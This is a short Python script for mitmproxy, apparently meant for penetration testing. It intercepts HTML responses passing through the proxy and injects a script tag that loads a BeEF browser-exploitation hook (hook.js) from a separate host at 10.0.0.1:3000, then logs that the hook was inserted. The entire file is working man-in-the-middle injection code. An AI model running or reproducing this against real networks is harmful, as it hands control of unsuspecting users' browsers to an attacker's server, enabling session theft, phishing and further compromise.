# Usage: mitmdump -s "modify_response_body.py mitmproxy bananas"
# (this script works best with --anticache)
from libmproxy.protocol.http import decoded
from bs4 import BeautifulSoup




def response(context, flow):
	if flow.response.headers.get_first("content-type", "").startswith("text/html"):
		with decoded(flow.response):  # automatically decode gzipped responses.
			# context.log("Type " + str(type(flow.response.content)))
			
			html = BeautifulSoup(flow.response.content)
			if html.head:
				# https should be considered
				script = html.new_tag("script", src=flow.request.scheme+"://10.0.0.1:3000/hook.js", type="text/javascript")
				
				
				html.head.append(script)
				#context.log(html.head)
				flow.response.content = str(html)
				context.log("Beef hook inserted.")
				
